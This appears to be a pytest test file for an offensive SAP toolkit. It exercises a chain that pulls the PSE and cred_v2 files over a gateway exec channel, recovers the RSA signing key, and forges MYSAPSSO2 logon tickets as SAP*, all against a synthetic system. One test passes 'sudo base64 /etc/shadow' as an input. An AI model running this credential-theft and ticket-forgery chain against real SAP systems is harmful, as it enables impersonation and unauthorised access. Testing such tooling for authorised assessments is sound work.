#!/usr/bin/env python3
"""Tests for the extract_and_forge_ticket orchestrator (commit 8).

Verifies that the high-level orchestrator wires together the entire
MYSAPSSO2 forgery chain end-to-end:

    extract_pse_bundle
      -> decrypt_cred_v2
      -> extract_signing_key
      -> forge_ticket
      -> save_ticket_artifacts
      -> state.track_forged_ticket

The chain is exercised with a real synthetic PSE built by
sap_pse_loot._build_test_pse, signed with a real RSA key.  No live
SAP system needed.
"""
from __future__ import annotations

import os
import sys

import pytest


# ===================================================================
# Build a working test PSE + cred_v2 + fake GW exec channel
# ===================================================================

@pytest.fixture
def test_pse_environment(tmp_path):
    """Construct a self-contained "compromised system" for the test.

    Returns a dict with:
      - sid             : SID for the simulated system
      - sidadm_user     : OS user the gw_exec_fn pretends to be
      - secudir         : virtual /usr/sap/<SID>/D00/sec path
      - pse_bytes       : a real DER-encoded PSE with a real RSA key
      - cred_v2_bytes   : a real cred_v2 file holding the PIN
      - pin             : the cleartext PIN
      - exec_fn         : a GwExecFn returning the right output for
                          `whoami`, `ls <secudir>`, `base64 <path>`
    """
    from sap_pse_loot import (
        _build_cred_v2_blob,
        _build_test_pse,
    )
    from cryptography.hazmat.primitives.asymmetric import rsa
    from cryptography.hazmat.primitives import serialization
    from cryptography import x509
    from cryptography.x509.oid import NameOID
    from cryptography.hazmat.primitives import hashes
    from datetime import datetime, timedelta, timezone

    sid = "TST"
    sidadm_user = "tstadm"
    secudir = f"/usr/sap/{sid}/D00/sec"
    pin = "test_pin_123"

    # Generate a real RSA private key + self-signed cert
    private_key = rsa.generate_private_key(
        public_exponent=65537, key_size=2048)
    subject = issuer = x509.Name([
        x509.NameAttribute(NameOID.COMMON_NAME, sid),
    ])
    now = datetime.now(timezone.utc)
    cert = (x509.CertificateBuilder()
            .subject_name(subject)
            .issuer_name(issuer)
            .public_key(private_key.public_key())
            .serial_number(0x1234ABCD)
            .not_valid_before(now - timedelta(days=1))
            .not_valid_after(now + timedelta(days=365))
            .sign(private_key, hashes.SHA256()))

    key_der = private_key.private_bytes(
        encoding=serialization.Encoding.DER,
        format=serialization.PrivateFormat.PKCS8,
        encryption_algorithm=serialization.NoEncryption(),
    )
    cert_der = cert.public_bytes(serialization.Encoding.DER)

    pse_bytes = _build_test_pse(key_der, cert_der, pin)

    # Build cred_v2 holding that PIN.  _build_cred_v2_blob already
    # encrypts (format 0, 3DES) — DO NOT wrap again.
    pse_path = f"{secudir}/SAPSYS.pse"
    cred_v2_bytes = _build_cred_v2_blob(pin, pse_path, sidadm_user,
                                          algo=0)

    # Files the fake GW channel will surface
    fs = {
        f"{secudir}/SAPSYS.pse": pse_bytes,
        f"{secudir}/cred_v2": cred_v2_bytes,
    }

    def exec_fn(program, args):
        """Simulates the GwExecFn shape — handles the calls the chain
        actually issues (whoami, ls, base64 <path>)."""
        import base64 as _b64
        a = (args or "").strip()
        if program == "whoami":
            return {"success": True,
                    "output": [sidadm_user, sidadm_user],  # double for TLV dup
                    "error": ""}
        if program == "ls":
            # Always return the SECUDIR listing for any ls — the
            # chain only calls ls on secudir candidates
            if a.startswith("/usr/sap/"):
                files = ["SAPSYS.pse", "cred_v2", "ticket"]
                # Return as one line + duplicated (TLV scan artifact)
                listing = " ".join(files)
                return {"success": True,
                        "output": [listing, listing],
                        "error": ""}
            return {"success": True, "output": [], "error": ""}
        if program == "base64":
            data = fs.get(a)
            if data is None:
                return {"success": True,
                        "output": [f"base64: cannot open '{a}': "
                                   f"No such file or directory"],
                        "error": ""}
            # Return the file's base64 in standard 76-char wrapped form
            b64 = _b64.b64encode(data).decode("ascii")
            lines = [b64[i:i+76] for i in range(0, len(b64), 76)]
            return {"success": True, "output": lines, "error": ""}
        if program == "sudo":
            # Fallback path — pretend sudo isn't NOPASSWD
            return {"success": False,
                    "output": [],
                    "error": "sudo: a terminal is required"}
        return {"success": True, "output": [], "error": ""}

    return {
        "sid": sid,
        "sidadm_user": sidadm_user,
        "secudir": secudir,
        "pse_bytes": pse_bytes,
        "cred_v2_bytes": cred_v2_bytes,
        "pin": pin,
        "exec_fn": exec_fn,
        "private_key": private_key,
        "certificate": cert,
    }


# ===================================================================
# Helpers
# ===================================================================

def _make_node(sid: str, instance_nr: str = "00",
               hostname: str = "tsthost"):
    from sapmap_models import SAPNode, InstanceInfo
    inst = InstanceInfo(
        instance_nr=instance_nr,
        ip="10.0.0.1",
        ports={3300 + int(instance_nr): "gateway"},
    )
    return SAPNode(
        sid=sid, hostname=hostname, ip="10.0.0.1",
        instances=[inst], system_type="ABAP",
    )


# ===================================================================
# Orchestrator happy path
# ===================================================================

class TestExtractAndForgeTicket:

    def test_full_chain_success(self, test_pse_environment, tmp_path,
                                  monkeypatch):
        """The orchestrator runs every step end-to-end and produces a
        ForgedTicket on the state's forged_tickets list."""
        from sapmap_exploit import extract_and_forge_ticket
        from sapmap_models import SAPMAPState
        import sapmap_state

        # Redirect loot writes into tmp_path
        monkeypatch.setattr(sapmap_state, "LOOT_DIR",
                            str(tmp_path / "loot"))

        env = test_pse_environment
        node = _make_node(env["sid"])
        state = SAPMAPState()
        state.add_node(node)

        r = extract_and_forge_ticket(
            node=node, state=state,
            user="SAP*", client="100",
            validity_min=60,
            digest="sha256",   # RSA key needs sha224+
            exec_fn=env["exec_fn"],
        )
        assert r["success"], f"chain failed: {r['error']!r}"
        assert r["ticket"] is not None
        assert r["cookie_b64"]
        assert r["ticket_size"] > 0
        assert r["loot_path"]

        # The ticket landed on both state.forged_tickets and node.forged_tickets
        assert len(state.forged_tickets) == 1
        assert len(node.forged_tickets) == 1
        assert state.forged_tickets[0].user == "SAP*"
        assert state.forged_tickets[0].sid == env["sid"]
        assert state.forged_tickets[0].client == "100"

        # The node got marked pwned by track_forged_ticket
        assert node.pwned

    def test_steps_audit_trail(self, test_pse_environment, tmp_path,
                                 monkeypatch):
        """All 7 stages of the chain produce an audit entry."""
        from sapmap_exploit import extract_and_forge_ticket
        from sapmap_models import SAPMAPState
        import sapmap_state
        monkeypatch.setattr(sapmap_state, "LOOT_DIR",
                            str(tmp_path / "loot"))

        env = test_pse_environment
        node = _make_node(env["sid"])
        state = SAPMAPState()
        state.add_node(node)

        r = extract_and_forge_ticket(
            node=node, state=state, user="SAP*", client="100",
            digest="sha256", exec_fn=env["exec_fn"])

        names = [s["name"] for s in r["steps"]]
        for required in ("channel", "pse_extract", "cred_v2",
                          "key_extract", "forge", "artifacts", "track"):
            assert required in names, f"missing step {required}"

        # No false-positive steps (every step has ok True/False)
        for s in r["steps"]:
            assert "ok" in s
            assert isinstance(s["ok"], bool)

    def test_artifacts_actually_written(self, test_pse_environment,
                                          tmp_path, monkeypatch):
        from sapmap_exploit import extract_and_forge_ticket
        from sapmap_models import SAPMAPState
        import sapmap_state
        monkeypatch.setattr(sapmap_state, "LOOT_DIR",
                            str(tmp_path / "loot"))

        env = test_pse_environment
        node = _make_node(env["sid"])
        state = SAPMAPState()
        state.add_node(node)

        r = extract_and_forge_ticket(
            node=node, state=state, user="SAP*", client="100",
            digest="sha256", exec_fn=env["exec_fn"])

        assert r["success"]
        loot = r["loot_path"]
        assert os.path.isdir(loot), f"loot path missing: {loot}"
        expected = ["ticket.b64", "SAP*@TST.sap",
                    "curl.sh", "pyrfc.json", "_meta.txt"]
        for f in expected:
            assert os.path.isfile(os.path.join(loot, f)), \
                f"missing artifact: {f}"

    def test_ticket_carries_signer_provenance(self, test_pse_environment,
                                                tmp_path, monkeypatch):
        """signer_dn / signer_serial copied from the extracted cert."""
        from sapmap_exploit import extract_and_forge_ticket
        from sapmap_models import SAPMAPState
        import sapmap_state
        monkeypatch.setattr(sapmap_state, "LOOT_DIR",
                            str(tmp_path / "loot"))

        env = test_pse_environment
        node = _make_node(env["sid"])
        state = SAPMAPState()
        state.add_node(node)

        r = extract_and_forge_ticket(
            node=node, state=state, user="SAP*", client="100",
            digest="sha256", exec_fn=env["exec_fn"])
        assert r["success"]
        t = r["ticket"]
        # Cert subject was CN=TST in the fixture
        assert "CN=TST" in t.signer_dn
        # Serial 0x1234ABCD in hex
        assert "1234ABCD".lower() in t.signer_serial.lower()

    def test_recipient_pinning_propagated(self, test_pse_environment,
                                            tmp_path, monkeypatch):
        from sapmap_exploit import extract_and_forge_ticket
        from sapmap_models import SAPMAPState
        import sapmap_state
        monkeypatch.setattr(sapmap_state, "LOOT_DIR",
                            str(tmp_path / "loot"))

        env = test_pse_environment
        node = _make_node(env["sid"])
        state = SAPMAPState()
        state.add_node(node)

        r = extract_and_forge_ticket(
            node=node, state=state, user="SAP*", client="100",
            digest="sha256",
            recipient_sid="QAS", recipient_client="200",
            exec_fn=env["exec_fn"])
        assert r["success"]
        t = r["ticket"]
        assert t.recipient_sid == "QAS"
        assert t.recipient_client == "200"

    def test_explicit_pin_used(self, test_pse_environment,
                                 tmp_path, monkeypatch):
        from sapmap_exploit import extract_and_forge_ticket
        from sapmap_models import SAPMAPState
        import sapmap_state
        monkeypatch.setattr(sapmap_state, "LOOT_DIR",
                            str(tmp_path / "loot"))

        env = test_pse_environment
        node = _make_node(env["sid"])
        state = SAPMAPState()
        state.add_node(node)

        # Use the exact PIN from cred_v2 — should still work
        r = extract_and_forge_ticket(
            node=node, state=state, user="SAP*", client="100",
            digest="sha256", pin=env["pin"],
            exec_fn=env["exec_fn"])
        assert r["success"]

    def test_wrong_explicit_pin_fails_gracefully(
            self, test_pse_environment, tmp_path, monkeypatch):
        from sapmap_exploit import extract_and_forge_ticket
        from sapmap_models import SAPMAPState
        import sapmap_state
        monkeypatch.setattr(sapmap_state, "LOOT_DIR",
                            str(tmp_path / "loot"))

        env = test_pse_environment
        node = _make_node(env["sid"])
        state = SAPMAPState()
        state.add_node(node)

        r = extract_and_forge_ticket(
            node=node, state=state, user="SAP*", client="100",
            digest="sha256", pin="definitely-wrong-pin",
            exec_fn=env["exec_fn"])
        assert not r["success"]
        assert "signing key" in r["error"].lower() or \
               "decrypt" in r["error"].lower()
        # No ticket recorded on state
        assert len(state.forged_tickets) == 0


# ===================================================================
# Failure-mode handling
# ===================================================================

class TestFailureModes:

    def test_no_exec_channel(self, tmp_path):
        """Without a custom exec_fn AND no GW exploit module: clean fail."""
        from sapmap_exploit import extract_and_forge_ticket
        from sapmap_models import SAPMAPState
        node = _make_node("ABC")
        state = SAPMAPState()
        state.add_node(node)

        # Patch the availability flag to False to simulate the
        # "no GW module" environment
        import sapmap_exploit
        original = sapmap_exploit._GW_EXPLOIT_AVAILABLE
        sapmap_exploit._GW_EXPLOIT_AVAILABLE = False
        try:
            r = extract_and_forge_ticket(
                node=node, state=state, exec_fn=None)
        finally:
            sapmap_exploit._GW_EXPLOIT_AVAILABLE = original

        assert not r["success"]
        assert "no exec channel" in r["error"].lower()

    def test_pse_extract_failure(self, tmp_path, monkeypatch):
        """Whoami fails -> orchestrator surfaces a clean error."""
        from sapmap_exploit import extract_and_forge_ticket
        from sapmap_models import SAPMAPState

        # exec_fn that fails every command
        def broken_exec_fn(program, args):
            return {"success": False, "output": [],
                    "error": "channel broken"}

        node = _make_node("ABC")
        state = SAPMAPState()
        state.add_node(node)

        r = extract_and_forge_ticket(
            node=node, state=state, exec_fn=broken_exec_fn)
        assert not r["success"]
        assert "PSE extraction" in r["error"]
        assert len(state.forged_tickets) == 0

    def test_steps_record_failure_correctly(self, tmp_path, monkeypatch):
        from sapmap_exploit import extract_and_forge_ticket
        from sapmap_models import SAPMAPState

        def broken_exec_fn(program, args):
            return {"success": False, "output": [], "error": "no"}

        node = _make_node("ABC")
        state = SAPMAPState()
        state.add_node(node)

        r = extract_and_forge_ticket(
            node=node, state=state, exec_fn=broken_exec_fn)
        # First the channel succeeds, then pse_extract fails
        assert r["steps"][0]["name"] == "channel"
        assert r["steps"][0]["ok"] is True
        # Last recorded step before bail is pse_extract with ok=False
        assert any(s["name"] == "pse_extract" and not s["ok"]
                   for s in r["steps"])


# ===================================================================
# SSO2 pre-flight short-circuits (step 2.5 fast-path / skip behaviour)
# ===================================================================

class TestSso2PreflightShortCircuits:
    """Verify the orchestrator's step 2.5 doesn't trigger the slow
    chunked profile-file read in the common cases:

      1. Node has node.icm_ports already populated (from a prior
         forge in the same session) → reuse the cached result.
      2. No credentials available → skip the check entirely.
      3. RFC available but returns errors (SDK missing, auth
         failed) → skip the check entirely; do NOT fall back to
         the 5-10 minute profile-file read.

    All three paths must let the forge continue normally — the
    SSO2 check is informational, never a hard gate.
    """

    def test_icm_ports_cache_short_circuits_rfc(
            self, test_pse_environment, tmp_path, monkeypatch):
        """When node.icm_ports is already populated, the forge
        reuses it and skips calling check_sso2_via_rfc entirely
        — saves an RFC round trip per param + the SDK dependency."""
        from sapmap_exploit import extract_and_forge_ticket
        from sapmap_models import SAPMAPState
        import sapmap_state
        import sap_profile_check

        monkeypatch.setattr(sapmap_state, "LOOT_DIR",
                            str(tmp_path / "loot"))

        env = test_pse_environment
        node = _make_node(env["sid"])
        # Simulate a prior forge having populated icm_ports
        node.icm_ports = [
            {"port": 8000, "protocol": "http", "index": 0,
             "raw": "PROT=HTTP,PORT=8000"},
        ]
        state = SAPMAPState()
        state.add_node(node)

        # Spy on check_sso2_via_rfc — it MUST NOT be called when
        # icm_ports are already cached.
        calls = []
        original = sap_profile_check.check_sso2_via_rfc

        def spy(*args, **kwargs):
            calls.append((args, kwargs))
            return original(*args, **kwargs)

        monkeypatch.setattr(sap_profile_check,
                             "check_sso2_via_rfc", spy)

        r = extract_and_forge_ticket(
            node=node, state=state,
            user="SAP*", client="100", digest="sha256",
            exec_fn=env["exec_fn"])
        assert r["success"], f"forge failed: {r['error']!r}"
        assert len(calls) == 0, (
            f"check_sso2_via_rfc was called {len(calls)} times "
            f"despite cached icm_ports — the cache short-circuit "
            f"didn't fire")
        # The check result still gets surfaced — operator sees a
        # "cached" notice in the summary instead of fresh data.
        assert r["sso2_check"]["source"] == "cache:node.icm_ports"
        assert r["sso2_check"]["icm_ports"] == node.icm_ports

    def test_rfc_failure_skips_check_no_profile_fallback(
            self, test_pse_environment, tmp_path, monkeypatch):
        """When RFC returns errors (NW RFC SDK missing, auth
        failed, ...), the orchestrator logs + skips — it MUST
        NOT fall back to the 5-10 minute chunked profile-file
        read.  This was the operator's reported pain: a 7 KB
        DEFAULT.PFL became 101 sapxpg round trips."""
        from sapmap_exploit import extract_and_forge_ticket
        from sapmap_models import SAPMAPState, Credentials
        import sapmap_state
        import sap_profile_check

        monkeypatch.setattr(sapmap_state, "LOOT_DIR",
                            str(tmp_path / "loot"))

        env = test_pse_environment
        node = _make_node(env["sid"])
        # Give the node a credential so the RFC path gets tried
        # (without a credential, RFC is skipped before it errors).
        node.credentials.append(Credentials(
            username="JORIS", client="100", instance_nr="00",
            password="x", verified=True))
        state = SAPMAPState()
        state.add_node(node)

        # Force check_sso2_via_rfc to return an error result —
        # simulates "NW RFC SDK not installed" / similar.
        def fake_rfc(node, creds=None, conn_factory=None):
            return {
                "ok": False,
                "errors": ["sapmap_rfc unavailable (no SDK)"],
                "warnings": [],
                "observed": {},
                "merged_params": {},
                "icm_ports": [],
                "profiles_read": [],
                "profiles_failed": [],
                "source": "rfc:PFL_GET_SINGLE_PARAMETER",
            }

        monkeypatch.setattr(sap_profile_check,
                             "check_sso2_via_rfc", fake_rfc)

        # Spy on the profile-file read function — MUST NOT be
        # called.  (Previously the orchestrator fell back to it,
        # triggering the slow chunked base64 reads.)
        calls = []
        original = sap_profile_check.check_sso2_parameters

        def profile_spy(*args, **kwargs):
            calls.append((args, kwargs))
            return original(*args, **kwargs)

        monkeypatch.setattr(sap_profile_check,
                             "check_sso2_parameters", profile_spy)

        r = extract_and_forge_ticket(
            node=node, state=state,
            user="SAP*", client="100", digest="sha256",
            exec_fn=env["exec_fn"])
        # Forge still succeeded — the pre-flight is informational
        assert r["success"], f"forge failed: {r['error']!r}"
        # No profile-file read happened
        assert len(calls) == 0, (
            f"check_sso2_parameters (profile-file read) was "
            f"called {len(calls)} times — the fast-skip didn't "
            f"fire; operator would have eaten the 5-10 minute "
            f"chunked read penalty")

    def test_no_credentials_skips_check_no_profile_fallback(
            self, test_pse_environment, tmp_path, monkeypatch):
        """When the node has no usable credential at all, RFC
        can't be tried — and the orchestrator must NOT fall
        through to the slow profile-file read.  Skip cleanly."""
        from sapmap_exploit import extract_and_forge_ticket
        from sapmap_models import SAPMAPState
        import sapmap_state
        import sap_profile_check

        monkeypatch.setattr(sapmap_state, "LOOT_DIR",
                            str(tmp_path / "loot"))

        env = test_pse_environment
        node = _make_node(env["sid"])
        # No credentials, no created users — best_credentials()
        # returns None
        node.credentials = []
        node.created_users = []
        state = SAPMAPState()
        state.add_node(node)

        # Spy on profile-file read — must not fire
        calls = []
        original = sap_profile_check.check_sso2_parameters

        def profile_spy(*args, **kwargs):
            calls.append((args, kwargs))
            return original(*args, **kwargs)

        monkeypatch.setattr(sap_profile_check,
                             "check_sso2_parameters", profile_spy)

        r = extract_and_forge_ticket(
            node=node, state=state,
            user="SAP*", client="100", digest="sha256",
            exec_fn=env["exec_fn"])
        assert r["success"]
        assert len(calls) == 0, (
            f"check_sso2_parameters was called {len(calls)} "
            f"times despite no credentials — the operator would "
            f"have eaten the slow chunked-read penalty")


# ===================================================================
# Chunked-read adapter (sap_pse_loot.make_chunked_read_adapter)
# ===================================================================

class TestChunkedReadAdapter:

    def test_pass_through_non_base64(self):
        """Non-base64 commands go straight to the underlying exec_fn."""
        from sap_pse_loot import make_chunked_read_adapter
        calls = []

        def raw(program, args):
            calls.append((program, args))
            return {"success": True, "output": ["hi"], "error": ""}

        adapter = make_chunked_read_adapter(raw)
        r = adapter("whoami", "")
        assert r["success"]
        assert calls == [("whoami", "")]

    def test_chunked_read_reassembles_file(self):
        """A multi-chunk base64 read returns the full file as one b64 line."""
        from sap_pse_loot import make_chunked_read_adapter
        import base64 as _b64

        # Simulated target file: 200 bytes -> needs 3 chunks of 72
        target_path = "/path/to/somefile"
        target_bytes = bytes(range(200)) + b"END"  # 203 bytes
        # The fake exec_fn will respond to python3 -c print(b64encode(
        #     open(p,'rb').read()[O:E])) by returning the right slice.

        def raw(program, args):
            assert program == "python3"
            # args looks like: -c print(__import__('base64').b64encode(
            #   open('/path/to/somefile','rb').read()[O:E]).decode())
            # OR: -c print(__import__('os').path.getsize('...'))
            if "getsize" in args:
                return {"success": True,
                        "output": [str(len(target_bytes))],
                        "error": ""}
            # Parse the slice indices from the args
            import re
            m = re.search(r"read\(\)\[(\d+):(\d+)\]", args)
            assert m, f"unexpected python3 args: {args}"
            o, e = int(m.group(1)), int(m.group(2))
            chunk = target_bytes[o:e]
            return {"success": True,
                    "output": [_b64.b64encode(chunk).decode("ascii")],
                    "error": ""}

        adapter = make_chunked_read_adapter(raw)
        r = adapter("base64", target_path)
        assert r["success"]
        # Decode the single b64 line and verify it matches the file
        decoded = _b64.b64decode("".join(r["output"]))
        assert decoded == target_bytes

    def test_sudo_short_circuits(self):
        """sudo base64 calls return failure immediately (no NOPASSWD)."""
        from sap_pse_loot import make_chunked_read_adapter
        def raw(program, args):
            pytest.fail("sudo path should not call raw exec")
            return None
        adapter = make_chunked_read_adapter(raw)
        r = adapter("sudo", "base64 /etc/shadow")
        assert not r["success"]
        assert "sudo" in r["error"].lower()

    def test_chunk_size_correctness(self):
        """Custom chunk_raw_bytes uses the requested size."""
        from sap_pse_loot import make_chunked_read_adapter
        import base64 as _b64
        target_bytes = b"X" * 100
        slices = []

        def raw(program, args):
            assert program == "python3"
            if "getsize" in args:
                return {"success": True,
                        "output": [str(len(target_bytes))],
                        "error": ""}
            import re
            m = re.search(r"read\(\)\[(\d+):(\d+)\]", args)
            o, e = int(m.group(1)), int(m.group(2))
            slices.append((o, e))
            return {"success": True,
                    "output": [_b64.b64encode(
                        target_bytes[o:e]).decode("ascii")],
                    "error": ""}

        adapter = make_chunked_read_adapter(raw, chunk_raw_bytes=20)
        r = adapter("base64", "/foo")
        assert r["success"]
        # 100 / 20 = 5 chunks
        assert len(slices) == 5
        assert slices[0] == (0, 20)
        assert slices[-1] == (80, 100)

    def test_size_query_failure(self):
        """Failed size query produces a clean error."""
        from sap_pse_loot import make_chunked_read_adapter
        def raw(program, args):
            return {"success": False, "output": [],
                    "error": "*ERR* connection broken"}
        adapter = make_chunked_read_adapter(raw)
        r = adapter("base64", "/foo")
        assert not r["success"]
        assert "size" in r["error"].lower()

    def test_zero_byte_file(self):
        """A 0-byte file returns success with empty output."""
        from sap_pse_loot import make_chunked_read_adapter
        def raw(program, args):
            if "getsize" in args:
                return {"success": True, "output": ["0"],
                        "error": ""}
            return {"success": True, "output": [""], "error": ""}
        adapter = make_chunked_read_adapter(raw)
        r = adapter("base64", "/empty/file")
        assert r["success"]
        assert r["output"] == [""]
